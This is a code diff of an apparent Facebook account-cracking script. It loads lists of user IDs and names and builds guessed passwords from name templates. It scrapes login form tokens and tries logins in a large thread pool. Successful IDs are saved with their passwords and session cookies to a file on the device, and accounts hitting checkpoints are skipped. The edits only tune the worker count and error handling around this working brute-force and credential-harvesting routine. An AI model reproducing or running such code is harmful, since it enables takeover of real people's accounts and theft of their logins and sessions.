@@ -194,7 +194,7 @@ def filee():
             fb = "free"
         else:
             fb = "m"
-    with ThreadPool(max_workers=80) as heron:
+    with ThreadPool(max_workers=60) as heron:
         print(" [b]    [red1]✗ [chartreuse1]Total Uid [orange3]▶  [chartreuse1]" + str(len(file)))
         print(" [b]    [red1]✗ [light_green]Method    [orange3]▶  [light_green]M" + meth)
         for mal in file:
@@ -212,21 +212,21 @@ def file_sub(uid, pwx, name, meth, file, fb):
     global oks, loop, sys_ua
     session = requests.session()
 
+
+    sys.stdout.write(
+        f"\r\x1b[38;1;196m\x1b[38;0;196m└\x1b[38;1;196m\x1b[38;0;196m\033[38;5;46m[{sort.color()}M{meth}\033[38;5;46m]\x1b[1;97m-\033[38;5;46m[\x1b[1;90m{loop}\033[38;5;46m]\x1b[1;97m-\033[38;5;46m[\x1b[1;90mOK:{str(len(oks))}\033[38;5;46m]\x1b[1;97m-\033[38;5;46m[\x1b[1;90m{'{:.1%}'.format(loop / len(file))}\033[38;5;46m] \r")
+    sys.stdout.flush()
+    fs = name.split(' ')[0]
     try:
-        sys.stdout.write(
-            f"\r\x1b[38;1;196m\x1b[38;0;196m└\x1b[38;1;196m\x1b[38;0;196m\033[38;5;46m[{sort.color()}M{meth}\033[38;5;46m]\x1b[1;97m-\033[38;5;46m[\x1b[1;90m{loop}\033[38;5;46m]\x1b[1;97m-\033[38;5;46m[\x1b[1;90mOK:{str(len(oks))}\033[38;5;46m]\x1b[1;97m-\033[38;5;46m[\x1b[1;90m{'{:.1%}'.format(loop / len(file))}\033[38;5;46m] \r")
-        sys.stdout.flush()
-        fs = name.split(' ')[0]
-        try:
-            ls = name.split(' ')[1]
-        except:
-            ls = fs
+        ls = name.split(' ')[1]
+    except:
+        ls = fs
+    try:
         for pw in pwx:
             shadid = ua()
             ps = pw.replace('first', fs.lower()).replace('First', fs).replace('last', ls.lower()).replace('Last',
                                                                                                           ls).replace(
                 'Name', name).replace('name', name.lower())
-
             free_fb = session.get(f'https://{fb}.facebook.com').text
             info = {"lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
                     "jazoest": re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -277,14 +277,14 @@ def file_sub(uid, pwx, name, meth, file, fb):
                 open("/sdcard/SD-OK.txt", "a").write(uid + "|" + ps + "|" + coki + "\n")
                 oks.append(xd)
                 break
-
             elif "checkpoint" in heron_brand:
                 pass
-
                 # print(f"\r\r[green] [CP-ID] {uid} | {ps}")
             else:
                 continue
         loop += 1
-    except:
-
+    except Exception as e:
         time.sleep(30)
+
+
+filee()
